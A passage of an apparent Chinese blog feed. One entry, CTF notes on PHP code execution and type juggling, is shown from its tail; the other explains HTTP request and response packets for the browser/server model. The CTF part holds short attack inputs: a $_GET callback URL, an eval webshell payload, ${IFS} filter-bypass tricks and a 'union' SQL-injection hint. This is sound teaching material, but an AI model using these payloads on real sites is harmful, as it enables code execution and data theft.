class="hljs-string">&quot;argument&quot;</span>];<br><span class="hljs-variable">$dyn_func</span>(<span class="hljs-variable">$argument</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="反引号命令执行"><a href="#反引号命令执行" class="headerlink" title="反引号命令执行"></a>反引号命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> `ls -al`;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Curly-Syntax"><a href="#Curly-Syntax" class="headerlink" title="Curly Syntax"></a>Curly Syntax</h3><p>PHP 的 Curly Syntax 也能导致代码执行，它将执行花括号间的代码，并将结果替换回去。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;aaabbbccc $&#123;`ls`&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$foobar</span> = <span class="hljs-string">&quot;phpinfo&quot;</span>;<br>$&#123;<span class="hljs-string">&quot;foobar&quot;</span>&#125;();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>很多函数都可以执行回调函数，当回调函数用户可控时，将导致代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$evil_callback</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;callback&quot;</span>];<br><span class="hljs-variable">$some_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br><span class="hljs-variable">$new_array</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$evil_callback</span>, <span class="hljs-variable">$some_array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>攻击 payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.a.com/index.php?callback=phpinfo</span><br></code></pre></td></tr></table></figure><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>[在这儿呢](<a href="https://www.sunynov.top/2025/12/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">PHP反序列化漏洞 - suny</a>)</p><h2 id="PHP-特性"><a href="#PHP-特性" class="headerlink" title="PHP 特性"></a>PHP 特性</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;string&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php 不会严格检验传入的变量类型，也可以将变量自由的转换类型。</p><p>比如在 <code>$a == $b</code> 的比较中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-literal">null</span>; <br><span class="hljs-variable">$b</span> = <span class="hljs-literal">false</span>; <span class="hljs-comment">//为真 </span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br><span class="hljs-variable">$b</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">//同样为真</span><br></code></pre></td></tr></table></figure><p>然而，PHP 内核的开发者原本是想让程序员借由这种不需要声明的体系，更加高效的开发，所以在几乎所有内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而频繁的报错，然而这却带来了安全问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span>==<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-comment">//true</span><br><span class="hljs-number">0</span> == <span class="hljs-string">&#x27;abcdefg&#x27;</span> <span class="hljs-comment">//true</span><br><span class="hljs-number">0</span> === <span class="hljs-string">&#x27;abcdefg&#x27;</span> <span class="hljs-comment">//false</span><br><span class="hljs-number">1</span> == <span class="hljs-string">&#x27;1abcdef&#x27;</span> <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><h3 id="魔法-Hash"><a href="#魔法-Hash" class="headerlink" title="魔法 Hash"></a>魔法 Hash</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;0e132456789&quot;</span>==<span class="hljs-string">&quot;0e7124511451155&quot;</span> <span class="hljs-comment">//true</span><br><span class="hljs-string">&quot;0e123456abc&quot;</span>==<span class="hljs-string">&quot;0e1dddada&quot;</span> <span class="hljs-comment">//false</span><br><span class="hljs-string">&quot;0e1abc&quot;</span>==<span class="hljs-string">&quot;0&quot;</span>  <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>在进行比较运算时，如果遇到了 <code>0e\d+</code> 这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中 2 个数的值都是 0 因而就相等了。如果不满足 <code>0e\d+</code> 这种模式就不会相等。</p><h3 id="十六进制转换"><a href="#十六进制转换" class="headerlink" title="十六进制转换"></a>十六进制转换</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;0x1e240&quot;</span>==<span class="hljs-string">&quot;123456&quot;</span> <span class="hljs-comment">//true</span><br><span class="hljs-string">&quot;0x1e240&quot;</span>==<span class="hljs-number">123456</span> <span class="hljs-comment">//true</span><br><span class="hljs-string">&quot;0x1e240&quot;</span>==<span class="hljs-string">&quot;1e240&quot;</span> <span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><p>当其中的一个字符串是 <code>0x</code> 开头的时候，PHP 会将此字符串解析成为十进制然后再进行比较，<code>0x1240</code> 解析成为十进制就是 123456，所以与 <code>int</code> 类型和 <code>string</code> 类型的 123456 比较都是相等。</p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>常见的转换主要就是 <code>int</code> 转换为 <code>string</code>，<code>string</code> 转换为 <code>int</code>。</p><p><code>int</code> 转 <code>string</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$var</span> = <span class="hljs-number">5</span>;<br>方式<span class="hljs-number">1</span>：<span class="hljs-variable">$item</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$var</span>;<br>方式<span class="hljs-number">2</span>：<span class="hljs-variable">$item</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$var</span>);<br></code></pre></td></tr></table></figure><p><code>string</code> 转 <code>int</code>：<code>intval()</code> 函数。</p><p>对于这个函数，可以先看 2 个例子。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-string">&#x27;2&#x27;</span>)) <span class="hljs-comment">//2</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-string">&#x27;3abcd&#x27;</span>)) <span class="hljs-comment">//3</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-string">&#x27;abcd&#x27;</span>)) <span class="hljs-comment">//0</span><br></code></pre></td></tr></table></figure><p>说明 <code>intval()</code> 转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串， <code>intval()</code> 不会报错而是返回 0。</p><p>同时，程序员在编程的时候也不应该使用如下的这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$a</span>)&gt;<span class="hljs-number">1000</span>) &#123;<br> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;select * from news where id=&quot;</span>.<span class="hljs-variable">$a</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>这个时候 <code>$a</code> 的值有可能是 <code>1002 union</code>。</p><h3 id="内置函数的参数的松散性"><a href="#内置函数的参数的松散性" class="headerlink" title="内置函数的参数的松散性"></a>内置函数的参数的松散性</h3><p>内置函数的松散性说的是，调用函数时给函数传递函数无法接受的参数类型。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。</p><p><strong>md5()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array1</span>[] = <span class="hljs-keyword">array</span>(<br> <span class="hljs-string">&quot;foo&quot;</span> =&gt; <span class="hljs-string">&quot;bar&quot;</span>,<br> <span class="hljs-string">&quot;bar&quot;</span> =&gt; <span class="hljs-string">&quot;foo&quot;</span>,<br>);<br><span class="hljs-variable">$array2</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$array1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$array2</span>)); <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>PHP 手册中的 md5（）函数的描述是 <code>string md5 ( string $str [, bool $raw_output = false ] )</code>，<code>md5()</code> 中的需要是一个 string 类型的参数。但是当你传递一个 array 时，<code>md5()</code> 不会报错，只是会无法正确地求出 array 的 md5 值，这样就会导致任意 2 个 array 的 md5 值都会相等。</p><p><strong>strcmp()</strong></p><p><code>strcmp()</code> 函数在 PHP 官方手册中的描述是 <code>intstrcmp ( string $str1 ， string $str2 )</code>，需要给 <code>strcmp()</code> 传递 2 个 <code>string</code> 类型的参数。如果 <code>str1</code> 小于 <code>str2</code>，返回 -1，相等返回 0，否则返回 1。<code>strcmp()</code> 函数比较字符串的本质是将两个变量转换为 ASCII，然后进行减法运算，然后根据运算结果来决定返回值。</p><p>如果传入给出 <code>strcmp()</code> 的参数是数字呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span>=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$array</span>,<span class="hljs-string">&#x27;123&#x27;</span>)); <span class="hljs-comment">//null,在某种意义上null也就是相当于false。</span><br></code></pre></td></tr></table></figure><p><strong>switch()</strong></p><p>如果 <code>switch()</code> 是数字类型的 case 的判断时，switch 会将其中的参数转换为 int 类型。如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$i</span> =<span class="hljs-string">&quot;2abc&quot;</span>;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$i</span>) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i is less than 3 but not negative&quot;</span>;<br> <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i is 3&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个时候程序输出的是 <code>i is less than 3 but not negative</code> ，是由于 <code>switch()</code> 函数将 <code>$i</code> 进行了类型转换，转换结果为 2。</p><p><strong>in_array()</strong></p><p>在 PHP 手册中， <code>in_array()</code> 函数的解释是 <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code> ,如果strict参数没有提供，那么 <code>in_array</code> 就会使用松散比较来判断 <code>$needle</code> 是否在 <code>$haystack</code> 中。当 strict 的值为 true 时， <code>in_array()</code> 会比较 needls 的类型和 haystack 中的类型是否相同。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span>=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;3&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-variable">$array</span>)); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-string">&#x27;1bc&#x27;</span>, <span class="hljs-variable">$array</span>)); <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>可以看到上面的情况返回的都是 true，因为 <code>&#39;abc&#39;</code> 会转换为 0， <code>&#39;1bc&#39;</code> 转换为 1。</p><p><code>array_search()</code> 与 <code>in_array()</code> 也是一样的问题。</p><h2 id="小芝士"><a href="#小芝士" class="headerlink" title="小芝士"></a>小芝士</h2><h4 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h4><h5 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h5><ul><li><code>tac</code> 是一个常用的文本处理命令，核心功能是 <strong>反向输出文件内容</strong></li><li><code>more</code> 命令是 Linux 系统中用于分页显示文件内容的工具，在处理篇幅较长的文本文件时非常实用</li><li><code>less,tail,head</code></li></ul><h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>&lt;、&gt;、${IFS}、$IFS、$IFS$9</p><p><a href="https://blog.csdn.net/2401_84466223/article/details/139408099">CTF中的命令执行绕过方式</a></p><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>无参🐎</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">array_pop</span>(<span class="hljs-title">next</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-number">1</span>=<span class="hljs-title">phpinfo</span>();</span><br></code></pre></td></tr></table></figure><p>显示另一个文件</p><ul><li>include，require</li><li>highlight_file(glob(“&#x2F;f*”)[0])</li></ul><p><a href="https://www.runoob.com/php/php-preg_match.html">preg_match() 函数</a></p><p>[strpos() 函数](<a href="https://www.runoob.com/php/func-string-strpos.html">PHP strpos() 函数 | 菜鸟教程</a>)</p><p class="note note-success">本文摘自CTF-Wiki，原文基础上有改动</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>浏览器BS架构与请求包、返回包原理</title>
    <link href="/2025/11/06/%E6%B5%8F%E8%A7%88%E5%99%A8BS%E6%9E%B6%E6%9E%84%E4%B8%8E%E8%AF%B7%E6%B1%82%E5%8C%85%E3%80%81%E8%BF%94%E5%9B%9E%E5%8C%85%E5%8E%9F%E7%90%86/"/>
    <url>/2025/11/06/%E6%B5%8F%E8%A7%88%E5%99%A8BS%E6%9E%B6%E6%9E%84%E4%B8%8E%E8%AF%B7%E6%B1%82%E5%8C%85%E3%80%81%E8%BF%94%E5%9B%9E%E5%8C%85%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="浏览器BS架构与请求包、返回包原理"><a href="#浏览器BS架构与请求包、返回包原理" class="headerlink" title="浏览器BS架构与请求包、返回包原理"></a>浏览器BS架构与请求包、返回包原理</h1><h1 id="一、基础概念：什么是BS架构？"><a href="#一、基础概念：什么是BS架构？" class="headerlink" title="一、基础概念：什么是BS架构？"></a>一、基础概念：什么是BS架构？</h1><h2 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h2><p>BS架构全称为Browser&#x2F;Server（浏览器&#x2F;服务器）架构，是一种基于网络的软件架构模式。它以<strong>浏览器</strong>作为客户端的统一交互入口，用户通过浏览器发送操作请求，请求被传递至远程的<strong>服务器</strong>，服务器进行业务逻辑处理和数据运算后，将结果返回给浏览器，最终由浏览器解析并呈现给用户。</p><h2 id="1-2-核心特点"><a href="#1-2-核心特点" class="headerlink" title="1.2 核心特点"></a>1.2 核心特点</h2><ul><li><p><strong>客户端轻量化</strong>：无需安装专门的客户端软件，仅需通用浏览器（Chrome、Firefox、Edge等）即可完成所有交互，降低用户使用成本。</p></li><li><p><strong>服务端集中化</strong>：业务逻辑、数据存储、权限控制等核心功能均在服务器端实现，便于系统的维护、升级和数据管理（只需更新服务器，所有客户端即可同步使用新功能）。</p></li><li><p><strong>跨平台性强</strong>：只要设备支持浏览器，无论Windows、macOS、iOS、Android等系统，都能统一访问系统，解决了CS架构（客户端&#x2F;服务器）的跨平台兼容问题。</p></li><li><p><strong>依赖网络传输</strong>：客户端与服务器的交互完全依赖HTTP&#x2F;HTTPS等网络协议，网络稳定性直接影响系统使用体验。</p></li></ul><h2 id="1-3-与CS架构的核心区别"><a href="#1-3-与CS架构的核心区别" class="headerlink" title="1.3 与CS架构的核心区别"></a>1.3 与CS架构的核心区别</h2><table><thead><tr><th>对比维度</th><th>BS架构</th><th>CS架构</th></tr></thead><tbody><tr><td>客户端形式</td><td>通用浏览器</td><td>专用客户端软件</td></tr><tr><td>更新维护</td><td>服务器端统一更新</td><td>所有客户端逐一更新</td></tr><tr><td>跨平台性</td><td>强（浏览器兼容）</td><td>弱（需开发多版本客户端）</td></tr><tr><td>网络依赖</td><td>必须联网</td><td>部分功能可离线使用</td></tr></tbody></table><h1 id="二、BS架构的核心交互流程"><a href="#二、BS架构的核心交互流程" class="headerlink" title="二、BS架构的核心交互流程"></a>二、BS架构的核心交互流程</h1><p>浏览器与服务器的交互是BS架构的核心，整个流程遵循“请求-处理-响应”的闭环模式，具体步骤如下：</p><ol><li><p><strong>用户操作触发请求</strong>：用户在浏览器中进行操作（如输入网址、点击按钮、提交表单等），浏览器捕获该操作并准备发起请求。</p></li><li><p><strong>浏览器封装请求包</strong>：浏览器将用户需求转化为标准化的“请求包”，包含请求目标、请求方式、请求参数等关键信息，并通过HTTP&#x2F;HTTPS协议发送。</p></li><li><p><strong>请求包通过网络传输</strong>：请求包经本地网络、运营商网络、互联网传输至目标服务器。</p></li><li><p><strong>服务器接收并处理请求</strong>：服务器的监听程序（如Nginx、Tomcat）接收请求包，解析其中的需求，调用对应的业务逻辑模块（如Java的Spring Boot、Python的Django）进行处理，必要时访问数据库获取数据。</p></li><li><p><strong>服务器封装返回包</strong>：服务器将处理结果（如HTML页面、JSON数据、图片等）封装为“返回包”，包含响应状态、数据类型、具体内容等信息。</p></li><li><p><strong>返回包回传至浏览器</strong>：返回包沿原网络路径反向传输至发起请求的浏览器。</p></li><li><p><strong>浏览器解析并呈现结果</strong>：浏览器解析返回包中的数据，将其转化为用户可直观感知的内容（如网页、图片、文字），展示在界面上。</p></li></ol><p>核心总结：整个交互的本质是“请求包”与“返回包”的传递与解析，浏览器负责“发起请求+解析响应”，服务器负责“处理请求+生成响应”。</p><h1 id="三、关键载体：请求包（Request-Packet）"><a href="#三、关键载体：请求包（Request-Packet）" class="headerlink" title="三、关键载体：请求包（Request Packet）"></a>三、关键载体：请求包（Request Packet）</h1><h2 id="3-1-定义与作用"><a href="#3-1-定义与作用" class="headerlink" title="3.1 定义与作用"></a>3.1 定义与作用</h2><p>请求包是浏览器向服务器发送的“需求说明书”，是标准化的信息集合，用于明确告诉服务器“我是谁、我要什么、我提供什么参数”，确保服务器能准确理解并处理需求。</p><h2 id="3-2-核心组成部分（HTTP请求格式）"><a href="#3-2-核心组成部分（HTTP请求格式）" class="headerlink" title="3.2 核心组成部分（HTTP请求格式）"></a>3.2 核心组成部分（HTTP请求格式）</h2><p>HTTP协议规定了请求包的固定格式，主要分为三部分：<strong>请求行</strong>、<strong>请求头</strong>、<strong>请求体</strong>（可选），各部分以空行分隔。</p><h3 id="3-2-1-请求行：请求的核心标识"><a href="#3-2-1-请求行：请求的核心标识" class="headerlink" title="3.2.1 请求行：请求的核心标识"></a>3.2.1 请求行：请求的核心标识</h3><p>请求行是请求包的第一行，包含三个关键信息，用空格分隔：</p><ul><li><p><strong>请求方法</strong>：明确请求的类型，常用方法有：<br>  GET：获取资源（如访问网页、查询数据），请求参数附加在URL后，传输数据量小（通常≤2KB），且可见（不安全）。</p></li><li><p>POST：提交资源（如注册表单、上传文件），请求参数放在请求体中，传输数据量大，且不可见（相对安全）。</p></li><li><p>PUT：更新资源（全量更新）；DELETE：删除资源；PATCH：部分更新资源（RESTful API常用）。</p></li></ul><p><strong>请求URL</strong>：指定请求的目标资源地址（如<a href="https://www.baidu.com/s%EF%BC%89%EF%BC%8C%E5%8D%B3%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%B5%84%E6%BA%90%E7%9A%84%E5%94%AF%E4%B8%80%E6%A0%87%E8%AF%86%E3%80%82">https://www.baidu.com/s），即服务器上资源的唯一标识。</a></p><p><strong>HTTP版本</strong>：使用的HTTP协议版本，常用HTTP&#x2F;1.1（主流）、HTTP&#x2F;2（性能更优）、HTTP&#x2F;3（基于QUIC协议，低延迟）。</p><p>示例：GET <a href="https://www.baidu.com/s?wd=BS%E6%9E%B6%E6%9E%84">https://www.baidu.com/s?wd=BS架构</a> HTTP&#x2F;1.1</p><h3 id="3-2-2-请求头：请求的附加信息"><a href="#3-2-2-请求头：请求的附加信息" class="headerlink" title="3.2.2 请求头：请求的附加信息"></a>3.2.2 请求头：请求的附加信息</h3><p>请求头是一系列键值对（Key: Value），用于向服务器传递请求的附加信息，帮助服务器更精准地处理请求，常见请求头如下：</p><table><thead><tr><th>请求头字段</th><th>作用说明</th></tr></thead><tbody><tr><td>Host</td><td>指定目标服务器的域名或IP（如<a href="http://www.baidu.com),用于服务器在多域名部署时识别请求目标./">www.baidu.com），用于服务器在多域名部署时识别请求目标。</a></td></tr><tr><td>User-Agent（UA）</td><td>标识浏览器类型、版本及操作系统（如Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36），服务器可据此返回适配的页面（如移动端&#x2F;PC端页面）。</td></tr><tr><td>Accept</td><td>指定浏览器可接收的响应数据类型（如text&#x2F;html、application&#x2F;json），服务器据此返回对应格式的数据。</td></tr><tr><td>Cookie</td><td>存储浏览器端的身份信息（如登录状态、用户偏好），每次请求自动携带，实现“会话保持”（如登录后无需重复输入密码）。</td></tr><tr><td>Content-Type</td><td>仅POST请求需要，指定请求体的数据格式（如application&#x2F;x-www-form-urlencoded（表单）、multipart&#x2F;form-data（文件上传））。</td></tr></tbody></table><h3 id="3-2-3-请求体：请求的参数数据"><a href="#3-2-3-请求体：请求的参数数据" class="headerlink" title="3.2.3 请求体：请求的参数数据"></a>3.2.3 请求体：请求的参数数据</h3><p>请求体是可选部分，仅当请求需要传递大量参数或二进制数据时存在（如POST请求提交表单、上传文件），GET请求的参数通过URL传递，无请求体。</p><p>示例（表单提交的请求体）：username&#x3D;zhangsan&amp;password&#x3D;123456</p><h1 id="四、关键结果：返回包（Response-Packet）"><a href="#四、关键结果：返回包（Response-Packet）" class="headerlink" title="四、关键结果：返回包（Response Packet）"></a>四、关键结果：返回包（Response Packet）</h1><h2 id="4-1-定义与作用"><a href="#4-1-定义与作用" class="headerlink" title="4.1 定义与作用"></a>4.1 定义与作用</h2><p>返回包是服务器对浏览器请求的“处理结果报告”，包含服务器的处理状态、数据格式及具体的响应内容，确保浏览器能准确解析并呈现结果。</p><h2 id="4-2-核心组成部分（HTTP响应格式）"><a href="#4-2-核心组成部分（HTTP响应格式）" class="headerlink" title="4.2 核心组成部分（HTTP响应格式）"></a>4.2 核心组成部分（HTTP响应格式）</h2><p>与请求包对应，HTTP响应包也分为三部分：<strong>响应行</strong>、<strong>响应头</strong>、<strong>响应体</strong>，各部分以空行分隔。</p><h3 id="4-2-1-响应行：响应的状态标识"><a href="#4-2-1-响应行：响应的状态标识" class="headerlink" title="4.2.1 响应行：响应的状态标识"></a>4.2.1 响应行：响应的状态标识</h3><p>响应行是返回包的第一行，包含三个关键信息：</p><ul><li><p><strong>HTTP版本</strong>：与请求包的HTTP版本对应（如HTTP&#x2F;1.1）。</p></li><li><p><strong>响应状态码</strong>：用数字标识请求的处理结果，分为5类（1xx-信息性、2xx-成功、3xx-重定向、4xx-客户端错误、5xx-服务器错误），常见状态码：<br>  200 OK：请求成功，服务器正常返回数据。</p></li><li><p>302 Found：临时重定向，引导浏览器访问新的URL。</p></li><li><p>400 Bad Request：请求参数错误，服务器无法解析。</p></li><li><p>401 Unauthorized：未授权，需先登录才能访问。</p></li><li><p>403 Forbidden：服务器拒绝访问（权限不足）。</p></li><li><p>404 Not Found：请求的资源不存在（URL错误）。</p></li><li><p>500 Internal Server Error：服务器内部错误（如代码bug）。</p></li><li><p>503 Service Unavailable：服务器暂时无法提供服务（如过载）。</p></li></ul><p><strong>状态描述</strong>：对状态码的文字解释（如OK、Not Found）。</p><p>示例：HTTP&#x2F;1.1 200 OK</p><h3 id="4-2-2-响应头：响应的附加信息"><a href="#4-2-2-响应头：响应的附加信息" class="headerlink" title="4.2.2 响应头：响应的附加信息"></a>4.2.2 响应头：响应的附加信息</h3><p>响应头也是键值对格式，用于向浏览器传递响应的附加信息，帮助浏览器解析数据，常见响应头如下：</p><table><thead><tr><th>响应头字段</th><th>作用说明</th></tr></thead><tbody><tr><td>Content-Type</td><td>指定响应体的数据格式（如text&#x2F;html（网页）、application&#x2F;json（接口数据）、image&#x2F;jpeg（图片）），是浏览器解析数据的核心依据。</td></tr><tr><td>Content-Length</td><td>指定响应体的字节大小，帮助浏览器判断数据是否传输完整。</td></tr><tr><td>Set-Cookie</td><td>服务器向浏览器设置Cookie（如登录后的身份令牌），后续请求会自动携带。</td></tr><tr><td>Cache-Control</td><td>指定响应数据的缓存策略（如max-age&#x3D;3600表示缓存1小时），减少重复请求，提升性能。</td></tr><tr><td>Location</td><td>配合3xx重定向状态码使用，指定新的跳转URL。</td></tr></tbody></table><h3 id="4-2-3-响应体：响应的核心数据"><a href="#4-2-3-响应体：响应的核心数据" class="headerlink" title="4.2.3 响应体：响应的核心数据"></a>4.2.3 响应体：响应的核心数据</h3><p>响应体是服务器返回的具体内容，也是浏览器最终呈现给用户的“原材料”，其格式由响应头的Content-Type决定，常见类型：</p><ul><li><p>text&#x2F;html：HTML代码，浏览器解析后生成网页界面。</p></li><li><p>application&#x2F;json：JSON格式数据，常用于前后端分离项目的接口响应（如接口返回{“code”:200,”data”:{“name”:”张三”}}）。</p></li><li><p>image&#x2F;jpeg、image&#x2F;png：图片二进制数据，浏览器直接渲染为图片。</p></li><li><p>text&#x2F;css、application&#x2F;javascript：CSS样式表、JS脚本，用于美化页面和实现交互逻辑。</p></li></ul><h1 id="五、实战：通过浏览器开发者工具查看请求-返回包"><a href="#五、实战：通过浏览器开发者工具查看请求-返回包" class="headerlink" title="五、实战：通过浏览器开发者工具查看请求&#x2F;返回包"></a>五、实战：通过浏览器开发者工具查看请求&#x2F;返回包</h1><p>浏览器的开发者工具（F12或Ctrl+Shift+I）是观察请求包和返回包的最佳工具，以Chrome为例，操作步骤如下：</p><ol><li><p>打开Chrome浏览器，访问目标网页（如<a 